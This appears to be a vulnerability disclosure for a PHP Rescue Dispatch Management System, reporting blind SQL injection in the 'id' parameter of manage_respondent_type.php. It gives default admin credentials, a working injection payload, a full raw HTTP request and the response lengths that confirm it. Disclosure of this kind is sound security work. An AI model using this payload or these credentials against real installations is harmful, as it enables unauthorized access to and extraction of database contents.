# Rescue Dispatch Management System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File:  /rdms/admin/respondent_types/manage_respondent_type.php?id=

Vulnerability location: /rdms/admin/respondent_types/manage_respondent_type.php?id=,id

[+] Payload: /rdms/admin/respondent_types/manage_respondent_type.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id

Current database name: rdms_db,length is 7

```sql
GET /rdms/admin/respondent_types/manage_respondent_type.php?id=1%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hkbchcmaitn0d8enhm4jtdjk9q
Connection: close
```

When length (database ()) = 6, Content-Length: 1965
![image](https://user-images.githubusercontent.com/54017627/170465906-c6448522-f1a4-4c44-81df-d0fa054e3f1f.png)

![image](https://user-images.githubusercontent.com/54017627/170465597-a3fb907f-21fb-4221-a246-902017286c66.png)

When length (database ()) = 7, Content-Length: 1983
![image](https://user-images.githubusercontent.com/54017627/170465879-f9a56b71-e2cc-47e0-a3b3-9bbfac661a00.png)

![image](https://user-images.githubusercontent.com/54017627/170465555-c0bf6c5b-33a1-45b2-807c-46934525784c.png)
